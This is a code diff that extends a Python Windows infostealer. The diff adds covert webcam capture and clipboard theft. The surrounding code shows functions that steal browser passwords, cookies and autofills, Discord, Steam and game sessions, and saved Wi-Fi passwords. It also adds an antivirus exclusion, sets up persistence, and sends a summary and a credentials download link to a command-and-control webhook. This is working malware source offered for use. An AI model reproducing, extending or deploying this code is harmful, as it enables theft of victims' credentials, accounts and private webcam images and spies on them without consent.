@@ -6,6 +6,7 @@ import re
 import struct
 import time
 import base64
+import cv2
 import threading
 import multiprocessing
 import sqlite3
@@ -36,9 +37,8 @@ multiprocessing.freeze_support()
 def write(file, content):
     with open(file, 'a', encoding='utf-8') as f:
         f.write(content)
-username = subprocess.run(["cmd", "/c", "whoami"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\\')[1].replace('\n', '')
-
-pcname = subprocess.run(["cmd", "/c", "whoami"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\\')[0].replace('\n', '')
+username = os.getenv('username')
+pcname = os.getenv('COMPUTERNAME')
 
 hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
 
@@ -249,6 +249,10 @@ minecraft_sessions: int = 0
 gd_session = 0
 steam_session = 0
 ss_success = 0
+webcam_success = 0
+process_count = 0
+clipboard_success = 0
+system_info = 0
 
 def get_master_key(local_state_path):
     try:
@@ -319,6 +323,7 @@ wifilist = getwifiprofiles()
 wifiprofiles: int = len(wifilist)
     
 def systeminfo():
+    global system_info, process_count
     syst_ = os.path.join(output, 'System')
     os.makedirs(syst_, exist_ok=True)
     sysinfooutput = os.path.join(syst_, 'System.txt')
@@ -394,18 +399,49 @@ def systeminfo():
         sys_lines.append('\nWi-Fi Networks:')
         for i, (network, password) in enumerate(wifilist):
             sys_lines.append(f'[{i + 1}]: {network}: {password}')
-            
+
+    sys_lines.append(f'Antiviruses Installed:')
     for i, av in enumerate(antiviruses.splitlines()):
         sys_lines.append(f'[{i + 1}]: {av}')
 
-    sys_lines.append(f'\nTotal RAM: {round((totalram / 1073741824), 2)} GB\nAvailable RAM: {round((availableram / 1073741824), 2)} GB\nRAM Usage: {usedram}%\nFree RAM: {round((freeram / 1073741824), 2)} GB\n')
+    sys_lines.append(f'\nTotal RAM: {round((totalram / 1073741824), 2)} GB\nAvailable RAM: {round((availableram / 1073741824), 2)} GB\nRAM Usage: {ramusage}%\nFree RAM: {round((freeram / 1073741824), 2)} GB\n')
+
     sys_lines.append(f'Screen Resolution: {screenwidth}x{screenheight}\n')
+
     sys_lines.append(f'Refresh Rate: {refreshrate}hz\n')
-    sys_lines.append(f'Antiviruses Installed:')
+
     write(sysinfooutput, '\n'.join(sys_lines))
+    system_info = 1
     write(ipoutput, '\n'.join(ip_lines))
     write(procinfooutput, '\n'.join(proc_lines))
+    process_count = len(proc_lines)
 
+def get_webcam():
+    global webcam_success
+    if config.webcam:
+        cam_ = os.path.join(output, 'System', 'Webcam.png')
+        os.makedirs(os.path.dirname(cam_), exist_ok=True)
+        try:
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            if ret:
+                cv2.imwrite(cam_, frame)
+                webcam_success = 1
+            else:
+                webcam_success = 0
+            cap.release()
+        except:
+            webcam_success = 0
+
+def get_clipboard():
+    global clipboard_success
+    clip_ = os.path.join(output, 'System', 'Clipboard.txt')
+    try:
+        result = subprocess.run('powershell Get-Clipboard', capture_output=True, text=True, shell=True, check=True)
+        write(clip_, result.stdout.strip())
+        clipboard_success = 1
+    except:
+        clipboard_success = 0
 
 def screenshot():
     global ss_success
@@ -1093,7 +1129,7 @@ exclusion(os.getenv('userprofile'))
 kill()
 thread = threading.Thread(target=persistence, args=(copypath,))
 thread.start()
-funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam]
+funcs = [systeminfo, get_webcam, get_clipboard, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam]
 # systeminfo()
 # screenshot()
 # kill()
@@ -1141,7 +1177,7 @@ def sendtoc2(file):
           "embeds": [
             {
               "title": "GOD BLESS AMERICA",
-              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD S35510N: {'Yes' if gd_session == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
+              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nTotal Processes: {str(process_count)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD S35510N: {'Yes' if gd_session == 1 else 'No'}\nWebcam: {'Yes' if webcam_success == 1 else 'No'}\nClipboard: {'Yes' if clipboard_success == 1 else 'No'}\nSystem Info: {'Yes' if system_info == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
               "color": 3866871,
               "author": {
                 "name": "KirkG"
@@ -1168,8 +1204,12 @@ Total Autofills: {str(autofill_count)}
 Total History: {str(browsing_history)}
 Total Discord Accounts: {str(discord_accounts)}
 Total Minecraft Sessions: {str(minecraft_sessions)}
+Total Processes: {str(process_count)}
 Steam Session: {'Yes' if steam_session == 1 else 'No'}
 Geometry Dash Session: {'Yes' if gd_session == 1 else 'No'}
+Webcam: {'Yes' if webcam_success == 1 else 'No'}
+Clipboard: {'Yes' if clipboard_success == 1 else 'No'}
+System Info: {'Yes' if system_info == 1 else 'No'}
 Screenshot: {"Yes" if ss_success == 1 else "No"}
 Wi-Fi Networks: {str(wifiprofiles)}
 Credentials: {download}
